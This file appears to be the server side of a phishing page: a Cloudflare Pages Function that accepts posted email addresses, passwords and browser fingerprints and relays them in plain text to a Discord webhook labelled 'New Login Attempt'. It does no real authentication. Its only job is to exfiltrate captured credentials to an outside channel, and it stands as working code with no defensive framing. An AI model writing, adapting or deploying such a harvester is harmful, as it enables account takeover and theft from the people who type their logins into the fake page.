import type { PagesFunction } from '@cloudflare/workers-types';
import { sendDiscordWebhook } from '../utils';

export const onRequest: PagesFunction = async ({ request, env }) => {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', { status: 405 });
  }

  let body: any;
  try {
    body = await request.json();
  } catch (err) {
    return new Response('Invalid JSON', { status: 400 });
  }

  const { email, password, fingerprint, theme } = body;
  const webhookUrl = env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) {
    console.error('DISCORD_WEBHOOK_URL not configured in environment');
    // make failure obvious to clients
    return new Response('Webhook not configured', { status: 500 });
  }

  const payload = {
    embeds: [
      {
        title: 'New Login Attempt',
        color: 0xff4b33,
        fields: [
          { name: 'Email', value: (email || 'N/A').toString().slice(0, 1024), inline: true },
          { name: 'Password', value: (password || 'N/A').toString().slice(0, 1024), inline: true },
          { name: 'Theme', value: (theme || 'Default').toString().slice(0, 1024), inline: true },
          { name: 'Fingerprint', value: `\`\`\`${(fingerprint || 'N/A').toString().slice(0, 1024)}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  const result = await sendDiscordWebhook(webhookUrl, payload);
  return new Response(JSON.stringify(result), {
    headers: { 'Content-Type': 'application/json' }
  });
};
